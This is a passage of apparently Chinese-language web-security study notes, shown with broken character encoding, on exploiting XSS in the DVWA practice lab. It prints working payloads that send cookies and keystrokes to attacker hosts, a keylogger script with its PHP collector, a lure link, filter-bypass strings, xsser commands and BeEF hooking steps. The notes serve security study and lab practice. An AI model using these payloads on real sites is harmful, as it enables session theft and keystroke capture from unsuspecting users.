<li>â–² å‘é€Cookiesä¿¡æ¯ï¼š<code>&lt;script&gt;new Image().src=&quot;http://1.1.1.1/c.php?output==&quot;+document.cookie;&lt;/script&gt;</code></li>
<li>â–² ç¯¡æ”¹é¡µé¢ï¼š<code>&lt;script&gt;document.body.innerHTML=&quot;&lt;div style=visibility:visible;&gt;&lt;h1&gt;THIS WEBSITE IS UNDER ATTACK&lt;/h1&gt;&lt;/div&gt;&quot;;&lt;/script&gt;</code></li>
</ul>
</li>
<li><p>çªƒå–Cookie</p>
<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼švi 1.html</code></strong>ï¼ˆbodyä¸­å†™å…¥urlï¼‰</li>
<li><code>&lt;script src=&quot;http://1.1.1.1/a.js&quot;&gt;&lt;/script&gt;</code></li>
</ul>
</li>
<li><p>a.jsæºç ï¼ˆéšè”½æ€§å¼ºï¼‰</p>
<ul>
<li>var img = new Image();</li>
<li>img.src=â€<a href="http://1.1.1.1:é80/cookies.php?cookie==&quot;+document.cookie" target="_blank" rel="noopener">http://1.1.1.1:é80/cookies.php?cookie==&quot;+document.cookie</a>;</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>â­jsæºç 
1.kaliï¼Œ/var/www/htmlï¼Œvi a.js
2.var img = new Image();
3.img.src=&quot;http://1.1.1.1:88/cookies.php?cookie==&quot;+document.cookie;ï¼ˆ88ç«¯å£ä¸ºncä¾¦å¬ç«¯å£ï¼‰
4.service apache2 start
5.æµè§ˆå™¨æ³¨å…¥ï¼š&lt;script src=&quot;http://1.1.1.1/a.js&quot;&gt;&lt;/script&gt;</code></pre></blockquote>
<h4 id="2-XSSâ€“é”®ç›˜è®°å½•"><a href="#2-XSSâ€“é”®ç›˜è®°å½•" class="headerlink" title="2. XSSâ€“é”®ç›˜è®°å½•"></a>2. XSSâ€“é”®ç›˜è®°å½•</h4><ul>
<li>Kaliä¸Šå¼€å¯apacheæœåŠ¡ï¼Œ<strong><code>ğŸ”ºå‘½ä»¤ï¼šservice apache2 start</code></strong></li>
<li>åœ¨kaliçš„/var/www/html/ä¸­å‡†å¤‡Keylogger.js</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">document.onkeypress = function(evt) &#123; </span><br><span class="line">    evt = evt || window.event </span><br><span class="line">    key = String.fromCharCode(evt.charCode) </span><br><span class="line">    if (key) &#123;       </span><br><span class="line">        var http = new XMLHttpRequest(); </span><br><span class="line">        var param = encodeURI(key) http.open(&quot;POST&quot;,&quot;http://192.168.20.8/keylogger.php&quot;,true); http.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">        http.send(&quot;key=&quot;+param); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>åœ¨kaliçš„/var/www/html/ä¸­å‡†å¤‡Keylogger.php</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    $key=$_POST[&apos;key&apos;]; </span><br><span class="line">    $logfile=&quot;keylog.txt&quot;; </span><br><span class="line">    $fp = fopen($logfile, &quot;a&quot;); </span><br><span class="line">    fwrite($fp, $key); </span><br><span class="line">    fclose($fp);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>åœ¨kaliçš„/var/www/html/ä¸­å‡†å¤‡keylog.txtï¼Œä¸éœ€è¦å†™å…¥æ•°æ®</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šchmod 777 keylog.txt</code></strong>ï¼ˆä¿è¯æ‰§è¡Œæƒé™ï¼‰</li>
<li>æµè§ˆå™¨ä¸­æ³¨å…¥<code>&lt;script src=&quot;http://1.1.1.1/keylogger.js&quot;&gt;&lt;/script&gt;</code></li>
<li>åœ¨æµè§ˆå™¨ä¸Šå»ºç«‹ä¸€ä¸ªa.html <ul>
<li><code>&lt;a href=&quot;http://192.168.20.10/dvwa/vulnerabilities/xss_r/?name=&lt;script +src=&#39;http://192.168.20.8/keylogger.js&#39;&gt;&lt;/script&gt;&quot;&gt;xssï¼ˆè¯±æƒ‘æ€§è¯­è¨€ï¼‰&lt;/a&gt;</code></li>
</ul>
</li>
</ul>
<h4 id="3-Xsserâ€“åŸºæœ¬ä½¿ç”¨"><a href="#3-Xsserâ€“åŸºæœ¬ä½¿ç”¨" class="headerlink" title="3. Xsserâ€“åŸºæœ¬ä½¿ç”¨"></a>3. Xsserâ€“åŸºæœ¬ä½¿ç”¨</h4><ul>
<li>å‘½ä»¤è¡Œ/å›¾å½¢åŒ–å·¥å…·</li>
<li>ç»•è¿‡æœåŠ¡å™¨ç«¯è¾“å…¥ç­›é€‰<ul>
<li>10è¿›åˆ¶/16è¿›åˆ¶ç¼–ç </li>
<li>unescape()</li>
</ul>
</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šxsser -u &quot;http://1.1.1.1/dvwa/vulnerabilities/&quot; -gï¼ˆGetæ–¹æ³•ï¼‰/-pï¼ˆPostæ–¹æ³•ï¼‰ &quot;xss_r/?name=XSSï¼ˆGetæ–¹æ³•/Postä¸ºbodyæ•°æ®æ®µï¼‰&quot; --cookie=&quot;securit=low;PHPSESSID=d23e469411707ff8210717e67c521a81&quot; -sï¼ˆæµ‹è¯•æäº¤åç»Ÿè®¡ï¼‰-vï¼ˆæ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ï¼‰--reverse-checkï¼ˆé˜²æ­¢hashå€¼è¯¯æŠ¥ï¼Œæäº¤å»ºç«‹ç½‘ç»œè¿æ¥çš„jsè„šæœ¬ï¼ŒåŸºäºè¿æ¥æ˜¯å¦å»ºç«‹ï¼‰</code></strong> â–² 2020.1.20åœ¨ä½å®‰å…¨çº§åˆ«ä¸‹æ³¨å…¥ä¸æˆåŠŸ</li>
<li>â€“heuristiï¼ˆæ£€æŸ¥è¢«è¿‡æ»¤çš„å­—ç¬¦ï¼‰</li>
</ul>
<h4 id="4-Xsserâ€“payloadç¼–ç "><a href="#4-Xsserâ€“payloadç¼–ç " class="headerlink" title="4. Xsserâ€“payloadç¼–ç "></a>4. Xsserâ€“payloadç¼–ç </h4><ul>
<li>å¯¹payloadç¼–ç ï¼Œç»•è¿‡æœåŠ¡å™¨ç«¯ç­›é€‰è¿‡æ»¤<ul>
<li>â€“Str      Use method String.FromCharCode()ï¼ˆå­—ç¬¦ä¸²ç¼–ç ï¼‰</li>
<li>â€“Une      Use Unescape() function â–² æ³¨é‡Š</li>
<li>â€“Mix      Mix String.FromCharCode() and Unescape()ï¼ˆæ··åˆç¼–ç ï¼‰</li>
<li>â€“Dec      Use Decimal encodingï¼ˆåè¿›åˆ¶ç¼–ç ï¼‰</li>
<li>â€“Hex      Use Hexadecimal encodingï¼ˆåå…­è¿›åˆ¶ç¼–ç ï¼‰</li>
<li>â€“Hes      Use Hexadecimal encoding, with semicolons</li>
<li>â€“Dwo      Encode vectors IP addresses in DWORDï¼ˆIPåœ°å€ç¼–ç ï¼ŒåŒå­—èŠ‚ï¼‰</li>
<li>â€“Doo      Encode vectors IP addresses in Octalï¼ˆIPåœ°å€ç¼–ç ï¼ŒOctalå½¢å¼ï¼‰</li>
<li>â€“Cem=CEM  Try -manually- different Character Encoding Mutations</li>
<li>(reverse obfuscation: good) -&gt; (ex: â€˜Mix,Une,Str,Hexâ€™)</li>
</ul>
</li>
</ul>
<h4 id="5-Xsserâ€“æ³¨å…¥æŠ€æœ¯"><a href="#5-Xsserâ€“æ³¨å…¥æŠ€æœ¯" class="headerlink" title="5. Xsserâ€“æ³¨å…¥æŠ€æœ¯"></a>5. Xsserâ€“æ³¨å…¥æŠ€æœ¯</h4><ul>
<li>æ³¨å…¥æŠ€æœ¯ï¼ˆå¤šé€‰ï¼‰<ul>
<li>â€“Coo      Cross Site Scripting Cookie injectionï¼ˆCookieæ³¨å…¥ï¼‰</li>
<li>â€“Xsa      Cross Site Agent Scriptingï¼ˆAgentæ³¨å…¥ï¼‰</li>
<li>â€“Xsr      Cross Site Referer Scriptingï¼ˆRefereræ³¨å…¥ï¼‰</li>
<li>â€“Dcp      Data Control Protocol injectionsï¼ˆæ•°æ®æ§åˆ¶åè®®æ³¨å…¥ï¼‰</li>
<li>â€“Dom      Document Object Model injectionsï¼ˆDOMå¯¹è±¡æ³¨å…¥ï¼‰</li>
<li>â€“Lnd      HTTP Response Splitting Induced codeï¼ˆHTTPå“åº”ä»£ç ï¼‰</li>
<li>â€“Anchor   Use Anchor Stealth payloader (DOM shadows!)</li>
<li>â€“Phpids   PHP - Exploit PHPIDS bug (0.6.5) to bypass filtersï¼ˆphpidsæ˜¯åŸºäºPHPçš„ä¸€ä¸ªå®‰å…¨æ¡†æ¶ï¼Œå­˜åœ¨Bugï¼‰</li>
<li>â€“Doss     XSS Denial of service (server) injectionï¼ˆæœåŠ¡å™¨æ‹’ç»æœåŠ¡ï¼‰</li>
<li>â€“Dos      XSS Denial of service (client) injectionï¼ˆå®¢æˆ·ç«¯æ‹’ç»æœåŠ¡ï¼‰</li>
<li>â€“B64      Base64 code encoding in META tag (rfc2397)ï¼ˆBase64ç¼–ç ï¼‰</li>
<li>â€“Onm      ONM - Use onMouseMove() event to inject codeï¼ˆé¡µé¢äº‹ä»¶æ³¨å…¥ï¼‰</li>
<li>â€“Ifr      Use <code>&lt;iframe&gt;</code>source tag to inject codeï¼ˆiframeæ³¨å…¥ï¼‰</li>
</ul>
</li>
</ul>
<h4 id="6-XSSâ€“DVWA"><a href="#6-XSSâ€“DVWA" class="headerlink" title="6. XSSâ€“DVWA"></a>6. XSSâ€“DVWA</h4><ul>
<li>Dvwaçš„XSS reflectedï¼ˆLowï¼‰</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    </span><br><span class="line">    if(!array_key_exists (&quot;name&quot;, $_GET) || $_GET[&apos;name&apos;] == NULL || $_GET[&apos;name&apos;] == &apos;&apos;)&#123;</span><br><span class="line"></span><br><span class="line">    $isempty = true;</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        </span><br><span class="line">    echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">    echo &apos;Hello &apos; . $_GET[&apos;name&apos;];</span><br><span class="line">    echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>Dvwaçš„XSS reflectedï¼ˆMediumï¼‰â€“å¯¹è¾“å‡ºçš„è¿‡æ»¤<ul>
<li>ç»•è¿‡æ–¹æ³•ï¼š<code>&lt;scri&lt;script&gt;pt&gt;alert(&#39;xss&#39;);&lt;/scri&lt;script&gt;pt&gt;</code></li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    if(!array_key_exists (&quot;name&quot;, $_GET) || $_GET[&apos;name&apos;] == NULL || $_GET[&apos;name&apos;] == &apos;&apos;)&#123;</span><br><span class="line"></span><br><span class="line">    $isempty = true;</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;</span><br><span class="line"></span><br><span class="line">    echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">    echo &apos;Hello &apos; . str_replace(&apos;&lt;script&gt;&apos;, &apos;&apos;, $_GET[&apos;name&apos;]);</span><br><span class="line">    echo &apos;&lt;/pre&gt;&apos;; </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>Dvwaçš„XSS reflectedï¼ˆHighï¼‰â€“å¯¹è¾“å‡ºçš„è¿‡æ»¤<ul>
<li>â–² htmlspecialchars() â†’ è¾“å‡ºhtmlç¼–ç &lt; â†’ &lt; &gt; â†’ &gt;</li>
<li>ç»•è¿‡å°è¯•: <strong><code>ğŸ”ºå‘½ä»¤ï¼šxsser -u &quot;http://1.1.1.1/dvwa/vulnerabilities/&quot; -g &quot;xss_r/?name=&quot; --cookie=&quot;security=high; PHPSESSID=d23e469411707ff8210717e67c521a81&quot; -Cem=&#39;Mix,Une,Str,Hex&#39;</code></strong></li>
<li>â–² è‹¥æ³¨å…¥ä»£ç ä½äº&lt;&gt;ä¹‹å†…ï¼Œå¯ä»¥ä¸è¾“å…¥&lt;&gt;ï¼Œç›´æ¥è¾“å…¥ä»£ç ï¼Œå¦‚Onclick=alert(â€˜xssâ€™)</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    </span><br><span class="line">    if(!array_key_exists (&quot;name&quot;, $_GET) || $_GET[&apos;name&apos;] == NULL || $_GET[&apos;name&apos;] == &apos;&apos;)&#123;</span><br><span class="line">    </span><br><span class="line">    $isempty = true;</span><br><span class="line">        </span><br><span class="line">    &#125; else &#123;</span><br><span class="line">    </span><br><span class="line">    echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">    echo &apos;Hello &apos; . htmlspecialchars($_GET[&apos;name&apos;]);</span><br><span class="line">    echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="7-XSS-stored"><a href="#7-XSS-stored" class="headerlink" title="7. XSS stored"></a>7. XSS stored</h4><ul>
<li>å­˜å‚¨å‹XSS<ul>
<li>é•¿æœŸå­˜å‚¨äºæœåŠ¡å™¨ç«¯</li>
<li>æ¯æ¬¡ç”¨æˆ·è®¿é—®éƒ½ä¼šè¢«æ‰§è¡Œjavascriptè„šæœ¬</li>
</ul>
</li>
<li>Nameï¼šå®¢æˆ·ç«¯è¡¨å•é•¿åº¦é™åˆ¶ï¼ˆå¥½çš„Web ApplicationåŒæ—¶åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯åšé•¿åº¦é™åˆ¶ï¼‰<ul>
<li>è§£é™¤é™åˆ¶ï¼šæµè§ˆå™¨å®¢æˆ·ç«¯ã€æˆªæ–­ä»£ç†</li>
</ul>
</li>
<li><code>&lt;script src=&quot;http://1.1.1.1/a.js&quot;&gt;&lt;/script&gt;</code></li>
<li>a.jsæºç ï¼ˆéšè”½æ€§å¼ºï¼‰<ul>
<li>var img = new Image();</li>
<li>img src=â€<a href="http://1.1.1.1/cookies.php?cookie=&quot;+document.cookie" target="_blank" rel="noopener">http://1.1.1.1/cookies.php?cookie=&quot;+document.cookie</a>;</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>â­jsæºç 
1.kaliï¼Œ/var/www/htmlï¼Œvi a.js
2.var img = new Image();
3.img src=&quot;http://1.1.1.1:88/cookies.php?cookie=&quot;+document.cookie;ï¼ˆ88ç«¯å£ä¸ºncä¾¦å¬ç«¯å£ï¼‰
4.service apache2 start
5.æµè§ˆå™¨æ³¨å…¥ï¼š&lt;script src=&quot;http://1.1.1.1/a.js&quot;&gt;&lt;/script&gt;</code></pre></blockquote>
<h4 id="8-XSS-storedâ€“DVWAï¼ˆâ–²-æ¢ä¸åŒå®‰å…¨çº§åˆ«çš„æ—¶å€™ï¼Œéœ€è¦æ¸…é™¤æ•°æ®åº“ï¼‰"><a href="#8-XSS-storedâ€“DVWAï¼ˆâ–²-æ¢ä¸åŒå®‰å…¨çº§åˆ«çš„æ—¶å€™ï¼Œéœ€è¦æ¸…é™¤æ•°æ®åº“ï¼‰" class="headerlink" title="8. XSS storedâ€“DVWAï¼ˆâ–² æ¢ä¸åŒå®‰å…¨çº§åˆ«çš„æ—¶å€™ï¼Œéœ€è¦æ¸…é™¤æ•°æ®åº“ï¼‰"></a>8. XSS storedâ€“DVWAï¼ˆâ–² æ¢ä¸åŒå®‰å…¨çº§åˆ«çš„æ—¶å€™ï¼Œéœ€è¦æ¸…é™¤æ•°æ®åº“ï¼‰</h4><ul>
<li>DVWAçš„XSS storedï¼ˆ&amp;messageã€Lowï¼‰<ul>
<li>åŸºæœ¬æ²¡æœ‰å¯¹&amp;messageã€&amp;nameè¿‡æ»¤ï¼Œå¯å®ç°ä»»æ„æ³¨å…¥</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;btnSign&apos;]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   $message = trim($_POST[&apos;mtxMessage&apos;]);</span><br><span class="line">   $name    = trim($_POST[&apos;txtName&apos;]);</span><br><span class="line">   </span><br><span class="line">   // Sanitize message input</span><br><span class="line">   $message = stripslashes($message);</span><br><span class="line">   $message = mysql_real_escape_string($message);</span><br><span class="line">   </span><br><span class="line">   // Sanitize name input</span><br><span class="line">   $name = mysql_real_escape_string($name);</span><br><span class="line">  </span><br><span class="line">   $query = &quot;INSERT INTO guestbook (comment,name) VALUES (&apos;$message&apos;,&apos;$name&apos;);&quot;;</span><br><span class="line">   </span><br><span class="line">   $result = mysql_query($query) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>DVWAçš„XSS storedï¼ˆMediumï¼‰<ul>
<li>ç»•è¿‡æ–¹æ³•ï¼š&amp;messageåŸºæœ¬æ— æ³•æ³¨å…¥ï¼Œ&amp;nameå¯ä»¥é€šè¿‡<code>&lt;scri&lt;script&gt;pt&gt;alert(&#39;xss&#39;);&lt;/scri&lt;script&gt;pt&gt;</code>ç»•è¿‡ â–² 2020.1.20&amp;nameä¸éœ€è¦ç»•è¿‡æ³¨å…¥</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;btnSign&apos;]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   $message = trim($_POST[&apos;mtxMessage&apos;]);</span><br><span class="line">   $name    = trim($_POST[&apos;txtName&apos;]);</span><br><span class="line">   </span><br><span class="line">   // Sanitize message input</span><br><span class="line">   $message = trim(strip_tags(addslashes($message)));</span><br><span class="line">   $message = mysql_real_escape_string($message);</span><br><span class="line">   $message = htmlspecialchars($message);</span><br><span class="line">    </span><br><span class="line">   // Sanitize name input</span><br><span class="line">   $name = str_replace(&apos;&lt;script&gt;&apos;, &apos;&apos;, $name);</span><br><span class="line">   $name = mysql_real_escape_string($name);</span><br><span class="line">  </span><br><span class="line">   $query = &quot;INSERT INTO guestbook (comment,name) VALUES (&apos;$message&apos;,&apos;$name&apos;);&quot;;</span><br><span class="line">   </span><br><span class="line">   $result = mysql_query($query) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>DVWAçš„XSS storedï¼ˆHighï¼‰</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;btnSign&apos;]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   $message = trim($_POST[&apos;mtxMessage&apos;]);</span><br><span class="line">   $name    = trim($_POST[&apos;txtName&apos;]);</span><br><span class="line">   </span><br><span class="line">   // Sanitize message input</span><br><span class="line">   $message = stripslashes($message);</span><br><span class="line">   $message = mysql_real_escape_string($message);</span><br><span class="line">   $message = htmlspecialchars($message);</span><br><span class="line">   </span><br><span class="line">   // Sanitize name input</span><br><span class="line">   $name = stripslashes($name);</span><br><span class="line">   $name = mysql_real_escape_string($name); </span><br><span class="line">   $name = htmlspecialchars($name);</span><br><span class="line">  </span><br><span class="line">   $query = &quot;INSERT INTO guestbook (comment,name) VALUES (&apos;$message&apos;,&apos;$name&apos;);&quot;;</span><br><span class="line">   </span><br><span class="line">   $result = mysql_query($query) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="9-XSS-DOM"><a href="#9-XSS-DOM" class="headerlink" title="9. XSS DOM"></a>9. XSS DOM</h4><ul>
<li>DOMå‹XSS<ul>
<li>ä¸€å¥—JSå’Œå…¶ä»–è¯­è¨€å¯è°ƒç”¨çš„æ ‡å‡†çš„API</li>
</ul>
</li>
</ul>
<p><img src="http://www.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=f66f-xKTDzcuepCGP1R9qnf5yzSEpWewBDFOJ4ZgiR74rXX7YTpJS9ZthPIXIwy-zMuvL6LE6JC52VMb9VnTpLNb9_SrR8jGaoghAOmTQyKrlr9h6MCdKg&file_name=/XSS-DOM.PNG" alt="DOMå‹XSS"></p>
<ul>
<li><code>&lt;script&gt;var img=document.createElement(&quot;img&quot;);img.src=&quot;http:// 192.168.20.8:88/log?&quot;+escape(document.cookie);&lt;/script&gt;</code></li>
</ul>
<h4 id="10-BEEF"><a href="#10-BEEF" class="headerlink" title="10. BEEF"></a>10. BEEF</h4><ul>
<li>æµè§ˆå™¨æ”»å‡»é¢ï¼ˆä¸å¯å¿½è§†ï¼ŒåŸºæœ¬ä¸Šæœ€æ¥è¿‘ç”¨æˆ·ï¼‰<ul>
<li>åº”ç”¨æ™®éè½¬ç§»åˆ°B/Sæ¶æ„ï¼Œæµè§ˆå™¨æˆä¸ºç»Ÿä¸€å®¢æˆ·ç«¯ç¨‹åº</li>
<li>ç»“åˆç¤¾ä¼šå·¥ç¨‹å­¦æ–¹æ³•å¯¹æµè§ˆå™¨è¿›è¡Œæ”»å‡»</li>
<li>æ”»å‡»æµè§ˆå™¨ç”¨æˆ·</li>
<li>é€šè¿‡æ³¨å…¥çš„JSè„šæœ¬ï¼Œåˆ©ç”¨æµè§ˆå™¨æ”»å‡»å…¶ä»–ç½‘ç«™</li>
</ul>
</li>
<li>BeFFï¼ˆBrowser exploitation frameworkï¼‰<ul>
<li>ç”Ÿæˆã€äº¤ä»˜payload</li>
<li>Rubyè¯­è¨€ç¼–å†™</li>
<li>æœåŠ¡å™¨ç«¯ï¼šç®¡ç†hookedå®¢æˆ·ç«¯</li>
<li>å®¢æˆ·ç«¯ï¼šè¿è¡Œå®¢æˆ·ç«¯æµè§ˆå™¨çš„Javascriptè„šæœ¬ï¼ˆhookï¼‰</li>
</ul>
</li>
<li>æ”»å‡»æ‰‹æ®µ<ul>
<li>åˆ©ç”¨ç½‘ç«™XSSæ¼æ´å®ç°æ”»å‡»</li>
<li>è¯±ä½¿å®¢æˆ·ç«¯è®¿é—®å«æœ‰hookçš„ä¼ªé€ ç«™ç‚¹</li>
<li>ç»“åˆä¸­é—´äººæ”»å‡»æ³¨å…¥hookè„šæœ¬</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>â­ä¸­é—´äººæ”»å‡»/åŠ«æŒ
è¿è¡Œå•†ï¼šé“¾è·¯åŠ«æŒï¼Œæ’å…¥jsè„šæœ¬ï¼Œæ¥å®£ä¼ å¹¿å‘Šï¼Œé»‘è‰²æ”¶å…¥
Hackerï¼šCDNåŠ«æŒï¼Œåœ¨CDNèŠ‚ç‚¹ä¸Šæ’å…¥jsè„šæœ¬</code></pre></blockquote>
<ul>
<li>å¸¸è§ç”¨é€”<ul>
<li>é”®ç›˜è®°å½•å™¨</li>
<li>ç½‘ç»œæ‰«æ</li>
<li>æµè§ˆå™¨ä¿¡æ¯æ”¶é›†</li>
<li>ç»‘å®šshell</li>
<li>ä¸metasploité›†æˆ</li>
</ul>
</li>
<li>æ¼”ç¤ºé¡µé¢ï¼šhttp://<IP_BeEF_Server>:3000/demos/basic.html</li>
<li>hook.jsï¼š<a href="http://127.0.0.1:3000/hook.js" target="_blank" rel="noopener">http://127.0.0.1:3000/hook.js</a></li>
<li>BeEFç™»é™†ç•Œé¢ï¼šusername:beef/password:beef â–² 2020.1.20ä¿®æ”¹å¯†ç ä¸ºadmin</li>
<li>BeEFç”¨æˆ·ç•Œé¢ï¼š<a href="http://127.0.0.1:3000/ul/panel" target="_blank" rel="noopener">http://127.0.0.1:3000/ul/panel</a></li>
<li>DVWAçš„XSS storedï¼ˆ$nameè¿›è¡Œhookï¼Œ$messageä¸æ³¨å…¥ï¼‰</li>
<li>Detailsï¼š<ul>
<li>æµè§ˆå™¨ã€æ’ä»¶ç‰ˆæœ¬ä¿¡æ¯ï¼›æ“ä½œç³»ç»Ÿä¿¡æ¯</li>
</ul>
</li>
<li>Logsï¼š<ul>
<li>æµè§ˆå™¨åŠ¨ä½œï¼šç„¦ç‚¹å˜åŒ–ã€é¼ æ ‡ç‚¹å‡»ã€ä¿¡æ¯è¾“å…¥</li>
</ul>
</li>
<li>Commandsï¼šå‘½ä»¤æ¨¡å—<ul>
<li>ç»¿è‰²æ¨¡å—ï¼šè¡¨ç¤ºæ¨¡å—é€‚åˆç›®æ ‡æµè§ˆå™¨ï¼Œå¹¶ä¸”æ‰§è¡Œç»“æœè¢«å®¢æˆ·ç«¯ä¸å¯è§</li>
<li>çº¢è‰²æ¨¡å—ï¼šè¡¨ç¤ºæ¨¡å—ä¸é€‚åˆå½“å‰ç”¨æˆ·ï¼Œæœ‰äº›çº¢è‰²æ¨¡å—ä¹Ÿå¯ä»¥æ­£å¸¸æ‰§è¡Œ</li>
<li>æ©™è‰²æ¨¡å—ï¼šæ¨¡å—å¯ç”¨ï¼Œä½†ç»“æœå¯¹ç”¨æˆ·å¯è§ï¼ˆCAMå¼¹çª—ç”³è¯·æƒé™ç­‰ï¼‰</li>
<li>ç°è‰²æ¨¡å—ï¼šæ¨¡å—æœªåœ¨ç›®æ ‡æµè§ˆå™¨ä¸Šæµ‹è¯•è¿‡</li>
</ul>
</li>
<li>ä¸»è¦æ¨¡å—<ul>
<li>Browsers</li>
<li>Exploits</li>
<li>Host</li>
<li>Persistenceï¼ˆæŒä¹…æ€§ï¼‰</li>
<li>Network</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
